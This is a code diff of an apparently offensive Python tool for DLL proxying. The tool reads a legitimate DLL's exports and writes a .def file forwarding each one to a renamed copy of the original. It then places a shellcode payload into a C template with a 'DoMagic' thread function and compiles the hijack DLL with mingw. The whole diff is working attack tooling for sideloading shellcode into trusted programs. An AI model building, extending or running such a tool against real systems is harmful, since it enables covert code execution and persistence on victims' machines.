@@ -16,7 +16,7 @@ template = """
 #define _CRT_SECURE_NO_DEPRECATE
 #pragma warning (disable : 4996)
 
-PRAGMA_COMMENTS
+//PRAGMA_COMMENTS
 
 DWORD WINAPI DoMagic(LPVOID lpParameter)
 {
@@ -78,7 +78,6 @@ def parse_args():
     parser.add_argument("-d", "--dllpath", help="Path to input DLL", required=True)
     parser.add_argument("-p", "--payload", help="Shellcode payload", required=True)
     parser.add_argument("-c", "--compile", help="Compile the DLL", action="store_true", required=False)
-
     return parser.parse_args()
 
 def setup_logging():
@@ -93,7 +92,7 @@ def get_exported_functions(dll_path):
         exports = []
         if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
             for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
-                exports.append((exp.name, exp.ordinal))
+                exports.append(exp.name)
         else:
             logging.warning("[-] No exports found in the DLL.")
         return exports
@@ -101,45 +100,66 @@ def get_exported_functions(dll_path):
         logging.error(f"[-] Failed to parse DLL: {e}")
         sys.exit(1)
 
+def directory_handler(base_path, dllname):
+    data_dir = os.path.join(base_path, "data")
+    if not os.path.exists(data_dir):
+        os.mkdir(data_dir)
+
+    dll_dir = os.path.join(data_dir, dllname)
+    if not os.path.exists(dll_dir):
+        os.mkdir(os.path.join(dll_dir))
+    return dll_dir
+
+def create_definition_file(dir, reference, dllname, exports):  
+    definition_file = os.path.join(dir, f"{dllname}.def")
+    with open(definition_file, 'w') as file:
+        file.write(f"LIBRARY {dllname}\n")
+        file.write("EXPORTS\n")
+        for func in exports:
+            name = func.decode('utf-8')
+            file.write(f"    {name}={reference}.{name}\n")
+    return definition_file
+
 def main():
     args = parse_args()
     setup_logging()
+    base_path = os.path.dirname(__file__)
+    pragmas = []
+    dll_name = os.path.splitext(os.path.basename(args.dllpath))[0]
+    temp_name = os.path.basename(tempfile.NamedTemporaryFile(delete=True).name)
+    tmp_dll_name = f"{temp_name}_{dll_name}.dll"
+    org_dll_name = f"original_{dll_name}.dll"
+    source_filename = f"{dll_name}_pragma.c"
 
     if not os.path.isfile(args.dllpath):
         logging.error("[-] DLL file does not exist.")
         sys.exit(1)
 
-    if not os.path.isfile(args.payload):
-        logging.error("[-] Shellcode file does not exist.")
-        sys.exit(1)
     logging.info(f"[+] Reading exports from {args.dllpath}")
     exports = get_exported_functions(args.dllpath)
-    logging.info(f"[+] Found {len(exports)} exported function(s):")
+    logging.info(f"[+] Found {len(exports)} exported function(s)")
+    
+    
+    source_output = template.replace("SHELLCODE", os.path.basename(args.payload))
+    
+    
+    dll_dir = directory_handler(base_path, dll_name)
+    def_file = create_definition_file(dll_dir, tmp_dll_name, dll_name, exports)
 
-    pragmas = []
-    orgDllName = os.path.splitext(os.path.basename(args.dllpath))[0]
-    temp_name = os.path.basename(tempfile.NamedTemporaryFile(delete=True).name)
+    shutil.copyfile(args.dllpath, os.path.join(dll_dir, org_dll_name))
+    shutil.copyfile(args.dllpath, os.path.join(dll_dir, tmp_dll_name))
+    shutil.copy(os.path.join(base_path, "pch.h"), dll_dir)
+    shutil.copy(os.path.join(base_path, "pch.cpp"), dll_dir)
+    shutil.copy(os.path.join(base_path, "framework.h"), dll_dir)
+    logging.info(f"[+] Original DLL copied to {org_dll_name}")
 
-    dllname = f"{temp_name}_{orgDllName}.dll"
-    source_filename = f"{temp_name}_pragma.c"
-
-    for func in exports:
-        name = func[0].decode('utf-8')
-        ordinal = func[1]
-        builder = f'#pragma comment(linker, "/export:{name}={temp_name}.{name},@{ordinal}")'
-        pragmas.append(builder)
-
-    tmp = template.replace("PRAGMA_COMMENTS", '\n'.join(pragmas))
-    source_output = tmp.replace("SHELLCODE", os.path.basename(args.payload))
-
-    shutil.copyfile(args.dllpath, dllname)
-    logging.info(f"[+] Original DLL copied to {dllname}")
-    with open(source_filename, 'w') as file:
+    src = os.path.join(dll_dir, source_filename)
+    with open(src, 'w') as file:
         file.write(source_output)
     logging.info(f"[+] Exporting DLL C source to {source_filename}")
 
     if not args.compile:
-        logging.info(f"[+] Success! Run 'x86_64-w64-mingw32-gcc {source_filename} -shared -o {orgDllName}.dll' to compile the DLL")
+        logging.info(f"[+] Success! Run 'x86_64-w64-mingw32-gcc {source_filename} -shared -o {dll_name}.dll {dll_name}.def' to compile the DLL")
         sys.exit(0)
     elif args.compile:
         path = shutil.which("x86_64-w64-mingw32-gcc")
@@ -148,16 +168,21 @@ def main():
             sys.exit(1)
         try:
             result = subprocess.run(
-                [path, source_filename, "-shared", "-o", f"{orgDllName}.dll"],
+                [path, 
+                 src, 
+                 "-shared", 
+                 "-o", 
+                 f"{os.path.join(dll_dir, dll_name)}.dll", 
+                 f"{os.path.join(dll_dir, dll_name)}.def"],
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 check=True,
                 text=True
             )
-            logging.info(f"[+] Success - compiled {source_filename} to {orgDllName}.dll")
+            logging.info(f"[+] Compiled {source_filename} to {dll_name}.dll")
         except subprocess.CalledProcessError as e:
             logging.error("[-] ", e.stderr)
             sys.exit(1)
-
+    
 if __name__ == "__main__":
     main()
